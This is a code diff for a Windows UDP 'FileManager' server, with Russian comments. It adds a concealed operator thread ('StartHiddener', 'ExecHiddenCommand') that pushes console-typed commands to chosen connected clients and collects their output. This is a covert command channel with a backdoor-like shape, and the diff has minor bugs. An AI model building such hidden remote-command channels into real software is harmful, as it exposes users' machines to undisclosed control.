@@ -8,13 +8,88 @@ using std::ofstream;
 using std::string;
 using std::stringstream;
 using std::vector;
+using std::queue;
+using std::pair;
+using std::thread;
 using std::lock_guard;
+using std::unique_lock;
 using std::mutex;
 using std::min;
 using std::cin;
 using std::cout;
 using std::endl;
 using std::cerr;
+
+void FileManager::run()
+{
+    if (StartServer() == -1)
+        return;
+
+
+    // Устанавливаем сокет в неблокирующий режим
+    u_long mode = 1;
+    if (ioctlsocket(socket_, FIONBIO, &mode) != 0)
+        std::cerr << "Ошибка при установке сокета в неблокирующий режим." << std::endl;
+
+    // Инициализируем пул потоков
+    InitializeThreadpoolEnvironment(&call_back_environ_);
+    pool_ = CreateThreadpool(NULL);
+    SetThreadpoolThreadMaximum(pool_, TH_SIZE_MAXIMUM);
+    SetThreadpoolThreadMinimum(pool_, TH_SIZE_MINIMUM);
+
+    SetThreadpoolCallbackPool(&call_back_environ_, pool_);
+
+    cleanupgroup_ = CreateThreadpoolCleanupGroup();
+    SetThreadpoolCallbackCleanupGroup(&call_back_environ_, cleanupgroup_, NULL);
+
+    // Запускаем поток с I/O для админа
+    Args* args = new Args;
+    args->ptr_ = this;
+    workcallback_ = StartHiddener;
+    work_ = CreateThreadpoolWork(workcallback_, args, &call_back_environ_);
+    SubmitThreadpoolWork(work_);
+
+    // Основной цикл отвечающий за обмен сообщениями
+    string request_str;
+    sockaddr_in client;
+    while (true)
+    {
+        // Проверяем наличие данных на чтение от клиента
+        request_str.clear();
+        RecvData(request_str, client);
+        if (!request_str.empty())
+        {
+            // Если получены данные от клиента, определяем их назначение
+            // Если это результат выполнения команды - оповещаем залоченный поток
+            // Если данные это запрос клиента - выделяем запрос в отдельный поток
+            if (request_str[0] == '#')
+            {
+                request_str.erase(0, 1);
+                Args* args = new Args;
+                args->data_ = request_str;
+                args->client_addr_ = client;
+                args->ptr_ = this;
+
+                workcallback_ = ThreadStarter;
+                work_ = CreateThreadpoolWork(workcallback_, args, &call_back_environ_);
+                SubmitThreadpoolWork(work_);
+            }
+            else {
+                client_data_ = request_str;
+                cv_.notify_one();
+            }
+        }
+
+        // Если очередь на отправку данных не пустая, отправляем и получаем данные
+        if (!requests_q.empty() and request_str.empty())
+        {
+            pair<string, sockaddr_in> request = requests_q.front();
+            SendData(request.first, request.second);
+            requests_q.pop();
+        }
+
+    }
+}
 
 int FileManager::StartServer()
 {
@@ -57,19 +132,19 @@ int FileManager::StopServer()
     return 0;
 }
 
-int FileManager::SendData(string data, sockaddr clientAddr) 
+int FileManager::SendData(string data, sockaddr_in client_addr) 
 {
     int total_bytes_send = 0, bytes_to_sent, bytes_sent;
 
     // Отправляем размер данных
     bytes_to_sent = htonl(data.size());
-    sendto(socket_, reinterpret_cast<char*>(&bytes_to_sent), sizeof(int), 0, (struct sockaddr*)&clientAddr, sizeof(clientAddr));
+    sendto(socket_, reinterpret_cast<char*>(&bytes_to_sent), sizeof(int), 0, (struct sockaddr*)&client_addr, sizeof(client_addr));
 
     // Отправляем данные блоками
     while (total_bytes_send < data.size())
     {
         bytes_to_sent = min(data.size() - total_bytes_send, BUFFER_SIZE);
-        bytes_sent = sendto(socket_, data.data() + total_bytes_send, bytes_to_sent, 0, (struct sockaddr*)&clientAddr, sizeof(clientAddr));
+        bytes_sent = sendto(socket_, data.data() + total_bytes_send, bytes_to_sent, 0, (struct sockaddr*)&client_addr, sizeof(client_addr));
 
         if (bytes_sent == SOCKET_ERROR)
         {
@@ -82,7 +157,7 @@ int FileManager::SendData(string data, sockaddr clientAddr)
     // Отправляем контрольную сумму
     unsigned checksum = GetCRC32(data);
     checksum = htonl(checksum);
-    bytes_sent = sendto(socket_, reinterpret_cast<char*>(&checksum), sizeof(checksum), 0, (struct sockaddr*)&clientAddr, sizeof(clientAddr));
+    bytes_sent = sendto(socket_, reinterpret_cast<char*>(&checksum), sizeof(checksum), 0, (struct sockaddr*)&client_addr, sizeof(client_addr));
     if (bytes_sent == SOCKET_ERROR)
     {
         cerr << "Ошибка отправки данных.\nError: " << GetLastError() << endl;
@@ -92,7 +167,7 @@ int FileManager::SendData(string data, sockaddr clientAddr)
     return total_bytes_send;
 }
 
-int FileManager::RecvData(string &data, sockaddr &client_addr)
+int FileManager::RecvData(string &data, sockaddr_in &client_addr)
 {
     int client_addr_size = sizeof(client_addr), expected_size = 0, bytes_read = 0;
     char local_buffer[BUFFER_SIZE + 1];
@@ -163,49 +238,55 @@ VOID FileManager::ThreadStarter(PTP_CALLBACK_INSTANCE Instance, PVOID Parameter,
     args->ptr_->ExecuteCommand(args->data_, args->client_addr_);
 }
 
-int FileManager::run()
+VOID FileManager::StartHiddener(PTP_CALLBACK_INSTANCE Instance, PVOID Parameter, PTP_WORK Work)
 {
-    HANDLE threadHandle;
-    if (StartServer() == -1)
-        return -1;
-
-
-    InitializeThreadpoolEnvironment(&call_back_environ_);
-    pool_ = CreateThreadpool(NULL);
-    SetThreadpoolThreadMaximum(pool_, TH_SIZE_MAXIMUM);
-    SetThreadpoolThreadMinimum(pool_, TH_SIZE_MINIMUM);
-
-    SetThreadpoolCallbackPool(&call_back_environ_, pool_);
-
-    cleanupgroup_ = CreateThreadpoolCleanupGroup();
-    SetThreadpoolCallbackCleanupGroup(&call_back_environ_, cleanupgroup_, NULL);
-
-    workcallback_ = ThreadStarter;
-    
-    Args* args = new Args;
-    while (true)
-    {
-        sockaddr client_addr;
-        string recv_data;
-        if (RecvData(recv_data, client_addr) == -1)
-        {
-            SendData(last_error_, client_addr);
-            continue;
-        }
-
-        args->ptr_ = this;
-        args->data_ = recv_data;
-        args->client_addr_ = client_addr;
-        work_ = CreateThreadpoolWork(workcallback_, args, &call_back_environ_);
-        SubmitThreadpoolWork(work_);
-    }
-
-    StopServer();
-    delete args;
-    return 0;
+    Args* args = reinterpret_cast<Args*>(Parameter);
+    args->ptr_->ExecHiddenCommand();
 }
 
-int FileManager::ExecuteCommand(string command, sockaddr client_addr)
+void FileManager::ExecHiddenCommand()
+{
+    string cmd;
+    int users_id;
+    while (true)
+    {
+        cmd.clear();
+        cout << "cmd: ";
+        getline(cin, cmd);
+        cout << "Available users:" << endl;
+        {
+            lock_guard<mutex> lock(mt_);
+            if (clients_addr_.size() == 0)
+            {
+                cout << "There are no known users";
+                Sleep(2000);
+                system("cls");
+                continue;
+            }
+            int i = 0;
+            for (auto it : clients_addr_)
+            {
+                cout << "id : [" << i << "]" << endl;
+            }
+            cout << "Select users id: ";
+        }
+        cin >> users_id;
+        sockaddr_in client_addr = clients_addr_[users_id];
+        {
+            unique_lock<mutex> lock(mt_);
+            requests_q.push(std::make_pair(cmd, client_addr));
+
+            cv_.wait(lock, [&] {return !client_data_.empty(); });
+            cmd = client_data_;
+            client_data_.clear();
+        }
+        cout << endl <<  "Output: " << cmd << endl;
+        
+        getline(cin, cmd);
+    }
+}
+
+int FileManager::ExecuteCommand(string command, sockaddr_in client_addr)
 {
     stringstream ss(command);
     string arg1, arg2;
@@ -259,16 +340,21 @@ int FileManager::ExecuteCommand(string command, sockaddr client_addr)
         break;
     default:
         last_error_ = "Undefined command!";
+        ret_value = -1;
         break;
     }
 
-    if (ret_value == -1)
-        SendData(last_error_, client_addr);
-    else
     {
-        data.empty() ? data = "0" : "";
-        SendData(data, client_addr);
+        lock_guard<mutex> lock(mt_);
+        if (ret_value == -1)
+            requests_q.push(make_pair(last_error_, client_addr));
+        else
+        {
+            data.empty() ? data = "0" : "";
+            requests_q.push(make_pair(data, client_addr));
+        }
     }
+
     return 0;
 }
 
